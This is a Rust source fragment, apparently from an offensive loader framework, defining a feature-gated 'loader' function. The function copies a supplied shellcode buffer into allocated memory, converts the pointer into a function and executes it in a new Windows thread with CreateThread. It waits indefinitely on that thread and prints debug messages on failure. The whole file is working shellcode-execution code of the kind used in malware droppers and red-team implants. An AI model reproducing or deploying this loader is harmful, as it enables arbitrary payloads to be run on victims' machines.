#[cfg(feature = "Mei_Thread")]
pub fn loader(shellcode: Vec<u8>) {
    use crate::common::memory;
    use windows::Win32::Foundation::{GetLastError, WAIT_FAILED};
    use windows::Win32::System::Threading::{WaitForSingleObject, CreateThread};
    if shellcode.is_empty() {
        return;
    }

    unsafe {
        let memory = memory::malloc_and_set_memory(shellcode);
        if memory.is_err() {
            if cfg!(debug_assertions) {
                println!("[-] Malloc and set memory failed: {:#?}!", GetLastError());
            }
            return;
        }
        let memory = memory.unwrap();
        if memory.get_ptr() == std::ptr::null_mut() {
            if cfg!(debug_assertions) {
                println!("[-] Get memory pointer failed!");
            }
            return;
        }

        let func = std::mem::transmute(memory.get_ptr());
        let thread = CreateThread(
            None,
            0,
            func,
            None,
            windows::Win32::System::Threading::THREAD_CREATION_FLAGS(0),
            None,
        );
        if thread.is_err() {
            return;
        }

        let _ = WaitForSingleObject(thread.unwrap(), 0xFFFFFFFF);
    }
}